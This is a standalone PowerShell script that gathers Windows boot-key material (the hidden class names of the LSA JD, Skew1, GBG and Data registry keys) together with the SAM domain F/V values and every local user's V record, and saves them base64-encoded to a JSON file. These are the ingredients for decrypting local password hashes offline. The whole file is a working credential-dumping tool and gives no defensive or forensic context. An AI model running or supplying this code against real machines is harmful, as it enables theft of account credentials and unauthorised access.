param(
    [Parameter(Mandatory = $true)][string]$Out,
    [Parameter(Mandatory = $true)][string]$Log
)

$ErrorActionPreference = 'Stop'
Set-Content -LiteralPath $Log -Value ("start {0:o}" -f (Get-Date)) -Encoding UTF8

function Write-Log([string]$m) {
    Add-Content -LiteralPath $Log -Value ("{0:HH:mm:ss} {1}" -f (Get-Date), $m)
}

Add-Type @"
using System;
using System.Text;
using System.Runtime.InteropServices;
public class RegInfo {
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern int RegOpenKeyEx(UIntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult);
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern int RegQueryInfoKey(IntPtr hKey, StringBuilder lpClass, ref uint lpcbClass, IntPtr lpReserved,
        IntPtr lpcSubKeys, IntPtr lpcbMaxSubKeyLen, IntPtr lpcbMaxClassLen, IntPtr lpcValues,
        IntPtr lpcbMaxValueNameLen, IntPtr lpcbMaxValueLen, IntPtr lpcbSecurityDescriptor, IntPtr lpftLastWriteTime);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern int RegCloseKey(IntPtr hKey);
}
"@

function Get-KeyClass([string]$sub) {
    $hklm = [UIntPtr]::new([uint64]2147483650)
    $phk = [IntPtr]::Zero
    $rc = [RegInfo]::RegOpenKeyEx($hklm, $sub, 0, 0x20019, [ref]$phk)
    if ($rc -ne 0) { throw "RegOpenKeyEx($sub) failed rc=$rc" }
    $sb = New-Object System.Text.StringBuilder 512
    [uint32]$len = 512
    $rc = [RegInfo]::RegQueryInfoKey($phk, $sb, [ref]$len, [IntPtr]::Zero, [IntPtr]::Zero,
        [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero,
        [IntPtr]::Zero, [IntPtr]::Zero)
    [void][RegInfo]::RegCloseKey($phk)
    if ($rc -ne 0) { throw "RegQueryInfoKey($sub) failed rc=$rc" }
    if ($len -eq 0) { return "" }
    return $sb.ToString().Substring(0, [int]$len)
}

try {
    Write-Log "whoami: $([Security.Principal.WindowsIdentity]::GetCurrent().Name)"

    $sel = Get-ItemProperty -Path 'HKLM:\SYSTEM\Select'
    $ccs = "ControlSet{0:D3}" -f [int]$sel.Current
    Write-Log "controlset: $ccs"

    $classes = @{}
    foreach ($n in 'JD', 'Skew1', 'GBG', 'Data') {
        $classes[$n] = Get-KeyClass "SYSTEM\$ccs\Control\Lsa\$n"
        Write-Log "class ${n}: '$($classes[$n])'"
    }

    $sam = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SAM\SAM\Domains\Account', $false)
    if ($null -eq $sam) { throw 'OpenSubKey returned null for SAM\SAM\Domains\Account (access denied)' }
    Write-Log "opened SAM domain account key"

    $F = $sam.GetValue('F')
    $V = $sam.GetValue('V')
    Write-Log "F: $($F.Length) bytes, V: $($V.Length) bytes"

    $users = @()
    $usersKey = $sam.OpenSubKey('Users')
    foreach ($rid in $usersKey.GetSubKeyNames()) {
        $us = $usersKey.OpenSubKey($rid)
        $uv = $us.GetValue('V')
        if ($null -ne $uv) {
            $users += @{ rid = $rid; V = [Convert]::ToBase64String($uv) }
            Write-Log "user $rid : $($uv.Length) bytes"
        }
    }

    $obj = @{
        controlset = $ccs
        classes    = $classes
        F          = [Convert]::ToBase64String($F)
        V          = [Convert]::ToBase64String($V)
        users      = $users
    }
    $obj | ConvertTo-Json -Depth 6 | Set-Content -LiteralPath $Out -Encoding UTF8
    Write-Log "done, wrote $Out"
}
catch {
    Write-Log ("ERROR: " + ($_ | Out-String))
    Write-Log ("STACK: " + $_.ScriptStackTrace)
    exit 1
}
